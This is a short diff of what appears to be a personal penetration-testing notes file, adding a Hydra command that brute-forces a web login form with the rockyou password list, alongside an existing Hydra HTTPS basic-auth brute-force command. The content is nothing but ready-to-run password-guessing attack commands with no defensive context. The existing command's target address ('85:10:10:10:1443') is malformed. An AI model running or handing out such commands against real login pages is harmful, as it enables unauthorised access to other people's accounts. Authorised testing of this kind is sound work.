@@ -1,3 +1,7 @@
 
 #hydra
 hydra -l user -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt "https-get://85:10:10:10:1443/:F=401" -V -I
+
+
+Post request
+hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com http-post-form "//auth.php?login=yes:tfUName=admin&tfUPass=^PASS^:Неверный логин или пароль."  -f -I
